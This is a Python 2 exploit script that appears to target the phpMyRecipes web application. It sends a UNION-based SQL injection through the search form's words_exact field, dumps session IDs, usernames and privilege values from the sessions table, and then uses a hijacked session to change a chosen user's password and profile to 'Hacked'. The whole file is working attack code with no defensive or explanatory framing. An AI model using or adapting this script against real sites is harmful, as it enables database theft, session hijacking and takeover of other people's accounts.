#!/usr/bin/python
 
import httplib
from bs4 import BeautifulSoup
import re
import os
 
###########
# Function that takes an SQL select statement and inject it into the words_exact variable of dosearch.php 
# Returns BeautifulSoup object 
###########
def sqli(select):
  inject = '"\' IN BOOLEAN MODE) UNION ' + select + '#'
  body = 'words_all=&words_exact=' + inject + '&words_any=&words_without=&name_exact=&ing_modifier=2'
  c = httplib.HTTPConnection('www.example.com:80')
  c.request("POST", '/phpMyRecipes/dosearch.php', body, headers)
  r = c.getresponse()
  html = r.read()
  return BeautifulSoup(html)
 
#############
# Variables #
#############
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Endocing": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded"}
select = 'SELECT userid,sessionID from sessions;'   # Modify the select statement to see what else you can do
data = {}
 
###########
# Run Injection and see what comes back
###########
soup = sqli(select)
 
###########
# Parse returned information with BeautifulSoup- store in data dictionary
###########
for ID in soup("a", text=re.compile(r"^.{32}$")):
  data[ID.string] = {}
  values = ['userid','username','cookieOK','privs','ts']
  for value in values:
   #select = "SELECT NULL,userid from sessions where sessionID='" + ID.string + "';"
   select = "SELECT NULL," + value + " from sessions where sessionID='" + ID.string + "';"
   soup = sqli(select)
   rval = soup("a")[-1].string
   data[ID.string][value] = rval
 
###########
# Loop through data- print session information and decide if you want to change a user's password
###########
for sessionid,values in data.iteritems():
 print "Session ID: " + sessionid
 for field,value in values.iteritems():
  print "\t" + field + ": " + value
 print("Do you want to change this user's password? (y/N)"),
 ans = 'N'
 ans = raw_input()
 goforth = re.compile("[Yy].*")
 if goforth.match(ans):
  print("Enter new password: "),
  os.system("stty -echo")
  password1 = raw_input()
  os.system("stty echo")
  print("\nAgain with the password: "),
  os.system("stty -echo")
  password2 = raw_input()
  os.system("stty echo")
  print ("")
  if password1 == password2:
   body = 'sid=' + sessionid + '&username=' + data[sessionid]['username'] + '&name=Hacked&email=hacked%40hacked.com&password1=' + password1 + '&password2=' + password1
   c = httplib.HTTPConnection('www.example.com:80')
   c.request("POST", '/phpMyRecipes/profile.php', body, headers)
   r = c.getresponse()
   html = r.read()
   print ("===================================")
   print BeautifulSoup(html)("p",{"class": "content"})[0].string
   print ("===================================\n\n")
  else:
   print "Passwords did not match"
